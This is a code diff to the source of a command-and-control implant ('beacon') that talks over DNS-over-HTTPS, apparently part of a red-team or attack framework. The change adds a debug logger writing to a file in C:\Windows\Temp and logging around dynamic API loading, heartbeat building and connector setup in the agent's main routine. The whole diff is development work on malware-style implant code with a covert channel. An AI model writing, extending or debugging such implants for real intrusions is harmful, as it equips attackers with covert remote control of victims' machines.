@@ -420,16 +420,50 @@ void AgentMain()
 	AgentClear(g_Agent->config->exit_method);
 }
 
+
 #elif defined(BEACON_DOH)
 
 #include "ConnectorDoH.h"
 #include "DnsCompression.h"
 ConnectorDoH* g_Connector;
 
+// Simple debug logger for DoH beacon to trace early exits.
+// Writes to C:\\Windows\\Temp\\ax_doh_beacon.log using Kernel32 APIs
+// resolved via ApiLoader (ApiWin).
+static void DohDebugLog(const char* msg)
+{
+	if (!ApiWin || !ApiWin->CreateFileA || !ApiWin->WriteFile)
+		return;
+
+	CHAR path[] = "C:\\Windows\\Temp\\ax_doh_beacon.log";
+	HANDLE hFile = ApiWin->CreateFileA(path,
+		FILE_APPEND_DATA,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+		return;
+
+	DWORD written = 0;
+	SIZE_T len = StrLenA((CHAR*)msg);
+	if (len)
+		ApiWin->WriteFile(hFile, msg, (DWORD)len, &written, NULL);
+	CHAR crlf[] = "\r\n";
+	ApiWin->WriteFile(hFile, crlf, 2, &written, NULL);
+	// We intentionally do not close the handle via CloseHandle here to
+	// keep the logger minimal; the OS will reclaim it on process exit.
+}
+
 void AgentMain()
 {
-	if (!ApiLoad())
+	DohDebugLog("[DoH] AgentMain start");
+	if (!ApiLoad()) {
+		DohDebugLog("[DoH] ApiLoad FAIL");
 		return;
+	}
+	DohDebugLog("[DoH] ApiLoad OK");
 
 	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
 	*g_Agent = Agent();
@@ -440,8 +474,11 @@ void AgentMain()
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 		
-	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
+	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize)) {
+		DohDebugLog("[DoH] SetConfig FAIL");
 		return;
+	}
+	DohDebugLog("[DoH] SetConfig OK, entering main loop");
 
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
